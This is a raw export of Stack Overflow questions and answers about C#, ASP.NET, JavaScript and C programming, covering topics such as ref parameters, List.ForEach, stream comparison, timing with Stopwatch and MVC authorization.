<pre><code>List&lt;string&gt; mylist =new List&lt;string&gt;();  
myList.add(""string1"");  
myList.add(""string2"");
</code></pre>

<p>Say I want to add 'test' at the end of each string, how can I do it in a simple way? Intuitively, I tried this which compiles ok:  </p>

<pre><code>myList.ForEach(s =&gt; s = s + ""test"");
</code></pre>

<p>But if I then look at the content of the List, nothing has changed. I guess I could use a for loop to iterate through the List but I'm looking for something very simple and using ForEach looks very neat.... but doesn't seem to work. Any ideas?</p>
","33708","","<p>It's not possible to do that unless the list type is a mutable reference type (and in that case, you can't still change the actual reference in the list but the object itself).</p>

<p>The reason is that <code>List&lt;T&gt;.ForEach</code> calls a <code>Action&lt;T&gt;</code> delegate with signature:</p>

<pre><code>delegate void Action&lt;T&gt;(T obj);
</code></pre>

<p>and here, the argument is <strong>passed by value</strong> (it's not <code>ref</code>). Like any method, you can't change the input argument when it's called by value:</p>

<p>The code is essentially equivalent to:</p>

<pre><code>void anonymous_method(string s) {
    s = s + ""test"";  // no way to change the original `s` inside this method.
}

list.ForEach(anonymous_method);
</code></pre>
"
"<p>I am looking for the fastest way to de/interleave a buffer.
To be more specific, I am dealing with audio data, so I am trying to optimize the time I spend on splitting/combining channels and FFT buffers.</p>

<p>Currently I am using a for loop with 2 index variables for each array, so only plus operations, but all the managed array checks will not compare to a C pointer method.</p>

<p>I like the Buffer.BlockCopy and Array.Copy methods, which cut a lot of time when I process channels, but there is no way for an array to have a custom indexer.</p>

<p>I was trying to find a way to make an array mask, where it would be a fake array with a custom indexer, but that proves to be two times slower when using it in my FFT operation. I guess there are a lot of optimization tricks the compiler can pull when accessing an array directly, but accessing through a class indexer cannot be optimized.</p>

<p>I do not want an unsafe solution, although from the looks of it, that might be the only way to optimize this type of operation.</p>

<p>Thanks.</p>

<p>Here is the type of thing I'm doing right now:</p>

<pre><code>private float[][] DeInterleave(float[] buffer, int channels)
{
    float[][] tempbuf = new float[channels][];
    int length = buffer.Length / channels;
    for (int c = 0; c &lt; channels; c++)
    {
        tempbuf[c] = new float[length];
        for (int i = 0, offset = c; i &lt; tempbuf[c].Length; i++, offset += channels)
            tempbuf[c][i] = buffer[offset];
    }
    return tempbuf;
}
</code></pre>
","33708","","<p>As there's no built in function to do that, using array indexes is the fastest operation you could think of. Indexers and solutions like that only make things worse by introducing method calls and preventing the JIT optimizer to be able to optimize bound checks.</p>

<p>Anyway, I think your current method is the fastest non-<code>unsafe</code> solution you could be using. If performance really matter to you (which usually does in signal processing applications), you can do the whole thing in <code>unsafe</code> C# (which is fast enough, probably comparable with C) and wrap it in a method that you'd call from your safe methods.</p>
"
"<p>I understand that if I pass a value-type (<code>int</code>, <code>struct</code>, etc.) as a parameter (without the <code>ref</code> keyword), a copy of that variable is passed to the method, but if I use the <code>ref</code> keyword a reference to that variable is passed, not a new one.</p>

<p>But with reference-types, like classes, even without the <code>ref</code> keyword, a reference is passed to the method, not a copy. So what is the use of the <code>ref</code> keyword with reference-types?</p>

<hr>

<p>Take for example:</p>

<pre><code>var x = new Foo();
</code></pre>

<p>What is the difference between the following?</p>

<pre><code>void Bar(Foo y) {
    y.Name = ""2"";
}
</code></pre>

<p>and</p>

<pre><code>void Bar(ref Foo y) {
    y.Name = ""2"";
}
</code></pre>
","33708","","<p>There are cases where you want to modify the actual <strong>reference</strong> and not the object pointed to:</p>

<pre><code>void Swap&lt;T&gt;(ref T x, ref T y) {
    T t = x;
    x = y;
    y = t;
}

var test = new[] { ""0"", ""1"" };
Swap(ref test[0], ref test[1]);
</code></pre>
"
"<p>I'm writing a class for managing my threading. How do I pass my method that needs threading into my helper class?</p>

<p>All that I'll be doing is creating a new thread and passing the method I've passed through into a new ThreadStart().</p>

<p>Thanks in advance.</p>
","33708","","<p>I'm not sure what you mean by passing <code>void</code> but this should help:</p>

<pre><code> void StartThread(ThreadStart method) {
     new Thread(method).Start();
 }
</code></pre>

<p>and call it with:</p>

<pre><code> StartThread(myMethod);
</code></pre>
"
"<p>I saw the following in the source for <a href=""http://webkit.org/misc/DatabaseExample.html"">WebKit HTML 5 SQL Storage Notes Demo</a>:    </p>

<pre><code>function Note() {
  var self = this;

  var note = document.createElement('div');
  note.className = 'note';
  note.addEventListener('mousedown', function(e) { return self.onMouseDown(e) }, false);
  note.addEventListener('click', function() { return self.onNoteClick() }, false);
  this.note = note;
  // ...
}
</code></pre>

<p>The author uses <em>self</em> in some places (the function body) and <em>this</em> in other places (the bodies of functions defined in the argument list of methods).  What's going on?  Now that I've noticed it once, will I start seeing it everywhere?</p>
","33708","","<p>The variable is captured by the inline functions defined in the method. <code>this</code> in the function will refer to another object. This way, you can make the function hold a reference to the <code>this</code> in the outer scope.</p>
"
"<p>I have a gridview and usercontrol on the page, I want to alter gridview from usercontrol. how can i do that?</p>

<p>And also how can I call functions in usercontrol's ""host""  page from the usercontrol?</p>

<p><strong>UPDATE:</strong></p>

<p>I have a dropdownlist inside this usercontrol, when the it's SelectedIndexChanged event is triggered i want the gridview on the host page to DataBind().</p>

<p>(Then, gridview using objectdatasource will read this dropdownlist selected item and use it as select parameter)</p>

<p>Also if it possible to make it as general as it possible, because the altered control is not always a gridview...</p>

<p>Thanks</p>
","33708","","<p>Use </p>

<pre><code>GridView grid = Page.FindControl(""GridViewID"") as GridView;
if (grid != null) {
      // ... grid.Method()...
}
</code></pre>

<p>It's a good approach to let the host page pass the grid view ID as a property to the user control, rather than hardcoding it.</p>
"
"<p>How can I determine by reflection if the type of an object is defined by a class in my own assembly or by the .NET Framework?</p>

<p>I dont want to supply the name of my own assembly in code, because it should work with any assembly and namespace.</p>
","33708","","<pre><code>obj.GetType().Assembly == System.Reflection.Assembly.GetExecutingAssembly()
</code></pre>

<p>Checks if the type is declared in the current assembly.</p>
"
"<p>I'm tring to get a string from a DataSet <em>without</em> using GetXml. I'm using WriteXml, instead. How to use it to get a string?
Thanks</p>
","33708","","<pre><code>StringWriter sw = new StringWriter();
dataSet.WriteXml(sw);
string result = sw.ToString();
</code></pre>
"
"<p>When I multiply 1.265 by 10000 , I get 126499.99999999999 when using Javascript.</p>

<p>Why is this so?</p>
","33708","","<p>It's a result of floating point representation error. Not all numbers that have finite decimal representation have a finite binary floating point representation. </p>
"
"<p>I am thinking about creating a screen saver. I have the whole thing, its graphics and the back-end kind of ready in my head. But I am not quite sure how to get the graphics out in code.</p>

<p>What I would like is a slide show of images with a bit of movement (kind of like the slide show in media center) and some floating text and shapes on top. The shapes somehow translucent.</p>

<p>I currently have a very simple static slideshow made in WinForms. Just a simple application that goes fullscreen and displays some images and pretends to fade them in and out in a hackish kind of way. But it is not very well made, and the performance is not very good. For example to prevent lag, I fade in a black square on top of the image, instead of fading in the actual image. Silly perhaps, but it kind of worked :p</p>

<p>Anyways, I would like to do a better job. But not sure where to start. Is WPF a good solution for this? Or should I look into DirectX or OpenGL? Is this something that could be handled well with XNA, or is that too game spesific?</p>
","33708","","<p>I guess XNA works well. There's a sample screensaver in C# Express, by the way.</p>
"
"<p>I want to do the following</p>

<pre><code>char a[] = { 'A', 'B', 'C', 'D'};
</code></pre>

<p>But I do not want to write these characters separately. I want something like</p>

<pre><code>#define S ""ABCD""

char a[] = { S[0], S[1], S[2], S[3] };
</code></pre>

<p>But this won't compile (gcc says 'initializer element is not constant').</p>

<p>I tried replacing the #define line with</p>

<pre><code>const char S[] = ""ABCD"";
</code></pre>

<p>But that doesn't seem to help.</p>

<p>How can I do this (or something similar) that lets me write the ""ABCD"" as a normal 'string', and not as four separate characters?</p>

<p>P.S. It seems that people do not read the question correctly...</p>

<p>I can't get the following code to compile:</p>

<pre><code>const char S[] = ""ABCD"";
char t[] = { S[0], S[1], S[2], S[3] };
char u[] = { S[3], S[2], S[1], S[0] };
</code></pre>
","33708","","<p>Simply</p>

<pre><code>const char S[] = ""ABCD"";
</code></pre>

<p>should work.</p>

<p>What's your compiler?</p>
"
"<p>I am looking for a way to have compile time assertions in the C# programming language, such as those provided by the BOOST library for C++, or the new C++0x standard.</p>

<p>My question is twofold; can this be achieved in standard, portable C#; Alternatively, can the behaviour be achieved via non-portable assumptions of the quirks of a given C# compiler?</p>

<p>A quick search on google revealed the following link to one <a href=""http://lunesu.com/index.php?/archives/62-Static-assert-in-C!.html"" rel=""nofollow"">technique</a>, whose standards compliance and compatibility I am unsure of.</p>
","33708","","<p><a href=""http://blogs.msdn.com/bclteam/archive/2008/11/11/introduction-to-code-contracts-melitta-andersen.aspx"" rel=""nofollow"">Code Contracts</a> will be added to C# 4.0. It's essentially the same idea done in an elegant way.</p>
"
"<p>In C, C++ and C# when using a condition inside a function or loop statement it's possible to use a <em>continue</em> or <em>return</em> statement as early as possible and get rid of the <em>else</em> branch of an <em>if-else</em> statement. For example:</p>

<pre><code>while( loopCondition ) {
    if( innerCondition ) {
        //do some stuff
    } else {
        //do other stuff
    }
}
</code></pre>

<p>becomes </p>

<pre><code> while( loopCondition ) {
    if( innerCondition ) {
        //do some stuff
        continue;
    }
    //do other stuff
}
</code></pre>

<p>and</p>

<pre><code>void function() {
    if( condition ) {
        //do some stuff
    } else {
        //do other stuff
    }
}
</code></pre>

<p>becomes </p>

<pre><code>void function() {
    if( condition ) {
        //do some stuff
        return;
    }
    //do other stuff
}
</code></pre>

<p>The ""after"" variant may be more readable if the if-else branches are long because this alteration eliminates indenting for the else branch.</p>

<p>Is such using of return/continue a good idea? Are there any possible maintenance or readability problems?</p>
","33708","","<p>My personal approach of choosing one is that if the body of the <code>if</code> part is very short (3 or 4 lines maximum), it makes sense to use the <code>return/continue</code> variant. If the body is long, it's harder to keep track of the control flow so I choose the <code>else</code> version.</p>

<p>As a result, normally, this approach limits the usage of <code>return/continue</code> style to <em>skip some data and avoid further processing</em> rather than <em>process this using one of the following methods</em> (which is better suited by <code>if/else</code>).</p>
"
"<p>I'm using linq to sql in my data layer where I have added a ""settings"" table to the regular asp_user table.
In this settings table I keep several records of which one is the prefered Unit (a foreign key to the Units table).</p>

<p>Now when this prefered unit needs to change (say from liter to kilogram), I do a call to my UnitService to get the correct unit instance and set my setting.PreferedUnit to this instance.
This creates a new (duplicate) item in the database (there are now two kilogram records in my Units table). This is of course not what I intended.</p>

<p>I have the feeling I'm doing a bunch of fundamental stuff wrong</p>

<pre><code>UserSetting setting = AccountService.GetUserSetting(user.Identity.Name);
if (setting.PreferedUnitId != unitId)
	 setting.Unit = UnitService.GetUnitById(unitId);
AccountService.SaveuserSetting(setting);
</code></pre>
","33708","","<p>What does <code>AccountService.SaveuserSetting</code> do? It's probably doing an unnecessary <code>InsertOnSubmit</code>.</p>
"
"<p>If I have an ASP.NET page making a request to a page in a different web site/server and that page tries to write a cookie, what will happen?
Will I have a cookie in the client machine? In the server of my first site? Will it be blocked because of some security issues?</p>

<p>Tks in advance!</p>
","33708","","<p>If you are making a request using <code>WebClient</code> or <code>WebRequest</code>, ... the server will send the cookies. If you want you should read those cookies from the response and store it somewhere.  Otherwise, it'll be discarded.</p>
"
"<p>We have a current (legacy) PHP based website that is unlikely to be redeveloped for the next year or so, that acts as our main portal.</p>

<p>We would like to develop new applications in ASP.Net, and plug them into the current portal - but we do not want our website users to have to log in twice.</p>

<p>Whats the best way to share authentication state between the two platforms?  They do not share the same server, database backend or even proxy.</p>
","33708","","<p>I guess your best bet is a separate database or memory backed server to handle session state. Either you could use ASP.NET's built in SQL Server-based session state and add hook it up to PHP manually or use a custom solution.</p>
"
"<pre><code>&lt;%
 for(int i = 0 ; i &lt; 10 ; i++) {
%&gt;
&lt;asp:CheckBox ID=""CheckBox&lt;%=i %&gt;"" runat=""server"" /&gt;
&lt;%
  }
%&gt;
</code></pre>

<p>But this code is not working
How can I add multiple controls using loops by this method?</p>
","33708","","<p>You can't use server controls in this way. You can easily render the <code>&lt;input&gt;</code> HTML element yourself though.</p>

<pre><code>&lt;%
 for(int i = 0 ; i &lt; 10 ; i++) {
%&gt;
&lt;input type=""checkbox"" id=""CheckBox&lt;%=i %&gt;"" name=""Checkbox&lt;%= i %&gt;"" /&gt;
&lt;%
  }
%&gt;
</code></pre>

<p>I'm not sure if this is what you want though, as you should handle the input manually using <code>Request.Form</code>.</p>
"
"<p>Is there any addon by which I can disable all catch blocks temporarily. I'm maintaining an application and I need to find out where exactly it is throwing exception. Someone has done error handling is done is all layers to make my job tough :(</p>
","33708","","<p>I don't know a way to disable catch blocks but what you are trying to achieve can be done easily a VS option in exceptions dialog:</p>

<pre><code>Debug -&gt; Exceptions -&gt; CLR Exceptions -&gt; Check the ""Thrown"" checkbox.
</code></pre>

<p>This way, VS will break immediately when an exception is being thrown before running any catch block.</p>
"
"<p>I have a recursive method on the base form that takes in a control and an enabled flag. It goes through every control on the form and based on what the control type is, it sets the background colour of the control accordingly and sets the enabled property to the parameter.</p>

<p>So generally, the method is called passing (this) as the control, it goes through all controls and their controls and sets things accordingly. This has worked fine but has the forms have had more and more controls added to them, you can actually see the controls disabling one by one and it doesnt look good.</p>

<p>Does anyone have an idea how i can either rewrite this or stop it from showing the disabling process on each control one by one? Something like a SuspendLayout which would work in this case? Its not an option to add a panel to the form and just disable it and reenable it at the end, because I have about 200 + forms that inherit from this base form and cant go through each one and force it to add the controls to the panel. This also wouldnt work because its not only a matter of enabling/disabling the controls, but applying other logic to them.</p>
","33708","","<p>Enclose the modification in:</p>

<pre><code>form.SuspendLayout();
</code></pre>

<p>and</p>

<pre><code>form.ResumeLayout(false); // read the doc about ""false"", might be a little unsafe
</code></pre>

<p>Also, traversing the control hierarchy might be time consuming. You could do that once and cache them in a list and refer to that list after that.</p>
"
"<p>I am wanting to compress results from QUERYS of the database before adding them to the cache.</p>

<p>I want to be able to compress any reference type.</p>

<p>I have a working version of this for compressing strings.. the idea based on scott hanselman 's blog post <a href=""http://shrinkster.com/173t"">http://shrinkster.com/173t</a> </p>

<p>any ideas for compressing a .net object?</p>

<p>I know that it will be a read only cache since the objects in the cache will just be byte arrays..</p>
","33708","","<p>This won't work for <strong>any</strong> reference type. This will work for <strong>Serializable</strong> types. Hook up a <code>BinaryFormatter</code> to a compression stream which is piped to a file:</p>

<pre><code>var formatter = new BinaryFormatter();
using (var outputFile = new FileStream(""OutputFile"", FileMode.CreateNew))
using (var compressionStream = new GZipStream(
                         outputFile, CompressionMode.Compress)) {
   formatter.Serialize(compressionStream, objToSerialize);
   compressionStream.Flush();
}
</code></pre>

<p>You could use a <code>MemoryStream</code> to hold the contents in memory, rather than writing to a file. I doubt this is really an effective solution for a cache, however.</p>
"
"<p>in a ASP.NET application (MVC) I have a foreach loop that loops through a structure that may contain or not some element:</p>

<pre><code>        &lt;% foreach (XElement segnalazione in ((XElement)ViewData[""collezioneSegnalazioni""]).Elements(""dossier"")) { %&gt;

            &lt;tr&gt;

                &lt;td&gt;&lt;%= Html.Encode(segnalazione.Element(""NUM_DOSSIER"").Value) %&gt;&lt;/td&gt;
                &lt;td&gt;&lt;%= Html.Encode(segnalazione.Element(""ANAG_RAGSOC_CGN"").Value) %&gt;&lt;/td&gt;
                &lt;td&gt;&lt;%= Html.Encode(segnalazione.Element(""ID_RIFATT_SEGN0"").Value) %&gt;&lt;/td&gt;
                &lt;td&gt;&lt;%= Html.Encode(segnalazione.Element(""FLG_STATUS"").Value) %&gt;&lt;/td&gt;
                &lt;td&gt;&lt;%= Html.Encode(segnalazione.Element(""DT_ACCADIMENTO"").Value)%&gt;&lt;/td&gt;
                &lt;td&gt;&lt;%= Html.Encode(segnalazione.Element(""COD_RAMO_LUNA"").Value) %&gt;&lt;/td&gt;
            &lt;/tr&gt;
        &lt;% } %&gt;
</code></pre>

<p>Now, I get a NullReferenceException when Element(""DT_ACCADIMENTO"") is not set within the XElement. Is there a quick way to handle this? I tried with</p>

<pre><code>&lt;td&gt;&lt;%= Html.Encode(segnalazione.Element(""DT_ACCADIMENTO"").Value ?? """")%&gt;&lt;/td&gt;
</code></pre>

<p>but it does not work as, I guess, it checks if <em>Value</em> is null, where I have a problem with the field itself.
Any help appriciated</p>
","33708","","<pre><code>&lt;td&gt;&lt;%= Html.Encode((string)segnalazione.Element(""DT_ACCADIMENTO"") ?? """")%&gt;&lt;/td&gt;
</code></pre>
"
"<p>In my ListView I want to use a property of the Container in an if statement on the aspx page as shown below. But I'm getting a ""The name 'Container' does not exist in the current context"" error. Can I not  the Container in an if statement?  </p>

<pre><code>   &lt;ItemTemplate&gt;
        &lt;tr&gt;
          &lt;td&gt;
            &lt;% if (EDIT_INDEX == (((ListViewItem)Container) as ListViewDataItem).DataItemIndex )
               {%&gt;
            &lt;span id=""row&lt;%#(((ListViewItem)Container) as ListViewDataItem).DataItemIndex %&gt;""
Some Stuff
       &lt;/span&gt;
&lt;% } %&gt;
</code></pre>
","33708","","<p><code>Container</code> is only available in binding expressions. Use a <code>&lt;%# .. %&gt;</code> block with the ternary operator (<code>?:</code>) and string concatenation to achieve the same thing.</p>

<p>Another solution that I have used is to put stuff in different <code>&lt;asp:Placeholder&gt;</code> controls whose <code>Visible</code> properties are binded to different boolean expressions and put the different possible representations inside those placeholders. Something like:</p>

<pre><code>&lt;ItemTemplate&gt;
    &lt;tr&gt;
      &lt;td&gt;
   &lt;asp:Placeholder runat=""server"" 
    Visible='&lt;%# EDIT_INDEX == (((ListViewItem)Container) as ListViewDataItem).DataItemIndex %&gt;'&gt;
        &lt;span id='row&lt;%#(((ListViewItem)Container) as ListViewDataItem).DataItemIndex %&gt;'&gt;
            Some Stuff
        &lt;/span&gt;
   &lt;/asp:Placeholder&gt;
</code></pre>
"
"<p>I am using ASP.NET's ""handler"" to show images in an application. I need to play files of audio and video like I do with the image: I recover it from database and show it on an aspx page. Can I create a ""handler"" for the video and the audio? I don't want that a dialog box is opened asking to the user if he wants to play or save the video file.</p>

<p>I want to play it like YouTube does.</p>

<p>Maybe I can use silverlight for that.</p>

<p>Thank you!</p>
","33708","","<p>It consists of two parts. </p>

<ol>
<li>A handler or something that streams the video under the hood.</li>
<li>A client (can be implemented in Silverlight or Flash) that's on an standard HTML page that fetches the video from the handler and displays it.</li>
</ol>
"
"<p>I have a Div with runat attribut=""server"" .I have an asp.net button control in my page,When this button is clicked,I want to hide the div.Is there any other option that changing visibility to false.I cant use the visibility to false,because when i change visibility,I cant access the same in my javascript since it is removed from the browser.I want to Show that hided div from my javascript</p>

<p>Any thoughts ?  Thanks in advance</p>
","33708","","<p>Add a <code>display:none</code> CSS style to the control:</p>

<pre><code>myDiv.Style.Add(HtmlTextWriterStyle.Display, ""none"");
</code></pre>
"
"<p>I have a situation that may seem ridiculus but I have not been able to figure out a good enough solution. To simplify things the problem is something like this, suppose you have an object like Manufacturer that has a countryname property (like car.Manufacturer.CountryName) and you want to be sure that the countryname property can not have duplicates or misspellings or other errors. </p>

<p>It is basically a string property but a string can be anything which I do not want. An object seems like overkill and an enum means I have to recompile if new countries are to be added or existing countries to be changed. </p>

<p>I could easily control this in a GUI but I need to control this in the application code. So I have an object with a property that could be a string, an object or an enum (or other) and I cant decide which to use. So my options are something like this:</p>

<p>a) Control this in the GUI and do not check this in the application code, taking the risk that I can get ""illegal"" country names.</p>

<p>b) Make an object (Country) and use that, which is overkill and makes the code more complex, but I have complete control over duplicates and all that stuff.</p>

<p>c) Use an enum and hope that I do not have to recompile too often. It is simple and effective but a static solution.</p>

<p>d) Use an internal string list of valid country names and have CountryName as a string property and make sure that it is validated against that string. I get validation and CountryName is just a simple string, but what if I change that internal string of valid country names? Than I have to make code the revalidates all Manufacturer objects in the program too make sure they still have valid contry names.</p>

<p>I am not totally sure how important it is too have valid country names but the more I think about this the more I realize that I am in a grey zone. An object, or struct, is too much, an enum too static, a string too simple. </p>

<p>I could be totally overcomplicating things here but I would really like too know what to do, or rather how to think, when you get into this grey zone of object vs string vs enum.</p>

<p>Thankfully yours!
Hal </p>
","33708","","<blockquote>
  <p>c) Use an enum and hope that I do not have to recompile too often. It is simple and  effective but a static solution.</p>
</blockquote>

<p>From this statement I can infer that your data can be subject to change. In these situations, I suggest using an external data store (a database, text file, XML file, whatever).</p>
"
"<p>In my application's Web.Config, i have 3 custom HttpModules configured</p>

<pre><code>&lt;httpModules&gt;
  &lt;add name=""1"" /&gt;
  &lt;add name=""2"" /&gt;
  &lt;add name=""3"" /&gt;
&lt;/httpModules&gt;
</code></pre>

<p>As part of my application tuning exercise, i have to get rid of these modules. So</p>

<ol>
<li>What are the best ways to replace it or any other solution?</li>
<li>Built - in modules like FormsAuthentication/Windows etc are not mentioned in my config file. does this mean they won't get trigerred?</li>
</ol>
","33708","","<ol>
<li><p>Without knowing what the modules are actually doing, it's hard to say how you'd want to replace them. Actually, it's even hard to say if it's a good thing to do. If a job is best suited by a module, it should be done by a module. There's nothing inherently bad about it.</p></li>
<li><p>They are not mentioned by the config file. ASP.NET engine itself knows about them intimately. They can be enabled and disabled by altering their respective config section (if it has one), like:</p>

<p><code>&lt;authentication mode=""None"" /&gt;</code></p></li>
</ol>
"
"<p>I have a page routed like <code>/Comments/Search/3</code> where i search and display all the comments of the thread ""3"".</p>

<p>I'm adding a sort function (by date, author etc). What is the best way to handle it? <code>/Comments/Search/3/Sort/Author</code> or <code>/Comments/Search/3?sort=author</code> ?</p>

<p>How do I automatically handle the querystring sort=author as a parameter in MVC?</p>

<p>Thanks</p>
","33708","","<p>ASP.NET MVC will handle that automatically in the query string case. You just add a <code>string sort</code> parameter to your action.</p>

<p>Which is better? Personally, I use the path to control the <strong>contents</strong> being displayed and querystring to control the <strong>presentation</strong> (how it's displayed, formatted, ...). So, for sorting, I'd go with the querystring method. But I don't think there's a technical disadvantage in either approach.</p>
"
"<p>I'm in a situation where I want to compare two binary files. One of them is already stored on the server with a pre-calculated Crc32 in the database from when I stored it originally.</p>

<p>I know that if the Crc is different then the files are definitely different. However, if the Crc is the same I don't know that the files are. So what I'm looking for is a nice efficient way of comparing the two streams on from the posted file and one from the file system.</p>

<p>I'm not an expert on streams but I'm well aware that I could easily shoot myself in the foot here as far as memory usage is concerned.</p>

<p>Any help is greatly appreciated.</p>
","33708","","<pre><code>static bool FileEquals(string fileName1, string fileName2)
{
    // Check the file size and CRC equality here.. if they are equal...    
    using (var file1 = new FileStream(fileName1, FileMode.Open))
        using (var file2 = new FileStream(fileName2, FileMode.Open))
            return StreamEquals(file1, file2);
}

static bool StreamEquals(Stream stream1, Stream stream2)
{
    const int bufferSize = 2048;
    byte[] buffer1 = new byte[bufferSize]; //buffer size
    byte[] buffer2 = new byte[bufferSize];
    while (true) {
        int count1 = stream1.Read(buffer1, 0, bufferSize);
        int count2 = stream2.Read(buffer2, 0, bufferSize);

        if (count1 != count2)
            return false;

        if (count1 == 0)
            return true;

        // You might replace the following with an efficient ""memcmp""
        if (!buffer1.Take(count1).SequenceEqual(buffer2.Take(count2)))
            return false;
    }
}
</code></pre>
"
"<p>What is the most exact way of seeing how long something, for example a method call, took in code?</p>

<p>The easiest and quickest I would guess is this:</p>

<pre><code>DateTime start = DateTime.Now;
{
    // Do some work
}
TimeSpan timeItTook = DateTime.Now - start;
</code></pre>

<p>But how exact is this? Are there better ways?</p>
","33708","","<p>Use the <a href=""http://msdn.microsoft.com/en-us/library/system.diagnostics.stopwatch.aspx"">Stopwatch</a> class</p>
"
"<p>Is using a User's IP addr as part of a Cookie's hashed value that I store in the database a bad idea? I read somewhere that since most user's have dynamic IP addresses that it was bad practice to use this as part of the hash. If so what kind of user data should I pull in the hash? Or do I really need to?</p>

<p>Thanks.</p>
","33708","","<p>While dynamic IP addresses (using DHCP) are an issue, they're not likely to change in small timeframes. The real problem arises from the fact that some users are behind proxies that make requests from different IP addresses all the time. </p>

<p>It <em>might</em> make sense in some Intranet environments, but I believe for a public Internet facing Web site, it's an absolute no-no.</p>
"
"<p>I need that some html in the area in the asp.net page that i am coding, is changed according to a string variable.
I was thinking about creating a label, and then change the text on it.</p>

<p>But the string variable contains something like:</p>

<pre><code>&lt;h2&gt;&lt;p&gt;Notify:&lt;/p&gt; alert&lt;/h2&gt;
</code></pre>

<p>So, I don't feel that give this to a label text is a good idea</p>

<p>How i can do?
Using response.write?
If I use response.write, my added code will be at the beginning of the html source, how i can tell him to add it in a specific ?</p>

<p>Thank you</p>
","33708","","<p>If you really don't want to use any server controls, you should put the <code>Response.Write</code> in the place you want the string to be written:</p>

<pre><code>&lt;body&gt;
&lt;% Response.Write(stringVariable); %&gt;
&lt;/body&gt;
</code></pre>

<p>A shorthand for this syntax is:</p>

<pre><code>&lt;body&gt;
&lt;%= stringVariable %&gt;
&lt;/body&gt;
</code></pre>
"
"<p>In C# and Vb.net,is any way without iterating by loop a bitarray to check contins any true or false value (Dotnet 2.0) ?</p>
","33708","","<p>I doubt there's any way you could do it without a loop under the hood (as a <code>BitArray</code> can be arbitrarily long, unlike <code>BitVector32</code>), but if you just don't want to write it yourself:</p>

<pre><code>var hasAnyTrue = input.Cast&lt;bool&gt;().Contains(true);
var hasAnyFalse = input.Cast&lt;bool&gt;().Contains(false);
</code></pre>
"
"<p>I'm reading up on ASP .NET MVC, and I just got to a section talking about the Authorize attribute.  It's saying that the Authorize attribute is used to check that a user is authenticated against a Controller.  Is this true?  I know that the attribute is designed to be used for authorization purposes, but is it also a best practice to use this attribute for authentication?</p>

<p>If not, what is the best practice for <em>verifying</em> (not performing) authentication?</p>

<p>If so, why is it done this way?  Am I missing something?</p>
","33708","","<p><code>Authorize</code> attribute can be used to check to see whether the user is logged in. It can also be used to check if the user is a member of a specific role and has a specific name.</p>

<p>It essentially does the same thing handled by <code>&lt;authorization&gt;</code> section in <code>web.config</code> when using Web forms.</p>

<p>It doesn't specify the authentication method. It's handled by <code>&lt;authentication&gt;</code> section in <code>web.config</code> just like Web forms.</p>

<p><strong>EDIT (clarification about authentication and authorization):</strong></p>

<p>Authentication is <em>identity verification</em>. That is, you check to see who the user is. This can be performed by checking a user name and password, checking your Windows authentication token, scanning retina, voice identification or whatever else.</p>

<p>Authorization is the act of <em>limiting access</em> to a specific resource to users that satisfy a certain criteria. To be able to authorize a user to a resource, you should know the rights the user have. To check that, you should know who the user is in the first place. So the user have to be authenticated.  </p>

<p>Essentially an empty <code>[Authorize]</code> attribute does authorization, not authentication. It doesn't check who you are. It just checks if the one who you verified to be does have access to the resource or not. However, its authorization criteria is ""anyone successfully authenticated."" You can specify a different criteria. So, indeed it's doing authorization, not authentication.</p>
"
"<pre><code>&lt;%if (CanRemove) Response.Write(""&lt;b&gt;""+ProductName+""&lt;/b&gt;""); %&gt;
</code></pre>

<p>This code strikes me as ugly.  More specifically, any time I see a call to Response.Write inside an ascx or aspx file, I get suspicious that I'm doing something wrong.  Perhaps this is due to previously working with XSLT and noticing that when done right, there is rarely a need for <code>&lt;xsl:text&gt;</code> element in order to generate html.  I feel like it interferes with my ability to read the code when my html code is hidden inside a <code>&lt;% %&gt;</code> block.</p>

<p>Is this just something I need to get used to with Asp.Net or is there a better way to do it?</p>
","33708","","<p>An alternative approach is to use a <code>&lt;asp:Literal&gt;</code> control and bind (or manually set) its <code>Visible</code> property to <code>CanRemove</code> and its contents to the specific text.</p>

<p>Whether this approach is better or worse depends on the style the application is developed in. In ASP.NET MVC style apps (or those that heavily modify HTML directly), I think the current method makes more sense. In ASP.NET Web form and server control based apps, the <code>&lt;asp:Literal&gt;</code> solution is more consistent.</p>
"
"<p>I have a socket that is receiving HTTP requests.</p>

<p>So I have a raw http request in byte[] form from my socket.</p>

<p>I have to study this request - BUT</p>

<p>Instead of reinventing the wheel - can I <em>'cast'</em> this byte array into a System.Net.HttpWebRequest or something similar?</p>

<p>Thanks!</p>

<p>----- UPDATE ---------</p>

<p>So anyway I couldn't find the answer.  By digging a little further though I think it could be done by calling functions in:</p>

<p><b>HttpApi.dll</b>  <i>I think that the HttpWebRequest uses this dll (winxpsp2)</i></p>

<p>the interesting structure is the <a href=""http://msdn.microsoft.com/en-us/library/aa364545%28VS.85%29.aspx"" rel=""nofollow"">HTTP_REQUEST</a></p>

<pre><code>C++
typedef struct _HTTP_REQUEST {
  ULONG                  Flags;
  HTTP_CONNECTION_ID     ConnectionId;
  HTTP_REQUEST_ID        RequestId;
  HTTP_URL_CONTEXT       UrlContext;
  HTTP_VERSION           Version;
  HTTP_VERB              Verb;
  USHORT                 UnknownVerbLength;
  USHORT                 RawUrlLength;
  PCSTR                  pUnknownVerb;
  PCSTR                  pRawUrl;
  HTTP_COOKED_URL        CookedUrl;
  HTTP_TRANSPORT_ADDRESS Address;
  HTTP_REQUEST_HEADERS   Headers;
  ULONGLONG              BytesReceived;
  USHORT                 EntityChunkCount;
  PHTTP_DATA_CHUNK       pEntityChunks;
  HTTP_RAW_CONNECTION_ID RawConnectionId;
  PHTTP_SSL_INFO         pSslInfo;
}HTTP_REQUEST_V1, *PHTTP_REQUEST_V1;
</code></pre>

<p>I have only just started C# so delving into ??COM?? programming is over my head.<br/><br/>
AND looking through the ducumentation, I cant see an 'entry' (by which I mean a simple send bytes-> receieve HTTP_REQUEST).</p>

<p>Anyhoo! if anyone wants to point me in the direction of some nice WINDOWS KERNEL MODE HTTP SERVERS INCLUDING SSL then feel free it would be a great read and something to consider for the future.</p>
","33708","","<p>You can't cast it to <code>HttpWebRequest</code> or anything like that. Just throw the <code>Socket</code> away and use <code>HttpWebRequest</code> instead. Otherwise, you'll have to manually parse the response <code>byte[]</code>.</p>
"
"<p>I have a handful of assemblies on a network share. There is another application that uses reflection to load these and execute some code. The method that needs to be executed makes a web request, so I am getting a security exception when I try to do that. I have tried signing the assemblies, but that doesn't work. Does anyone have any thoughts on how I can get this to work?</p>
","33708","","<p>Use the <a href=""http://blogs.msdn.com/shawnfa/archive/2004/12/30/344554.aspx"" rel=""nofollow"">caspol.exe utility</a>. You can trust a single assembly or a network share.</p>
"
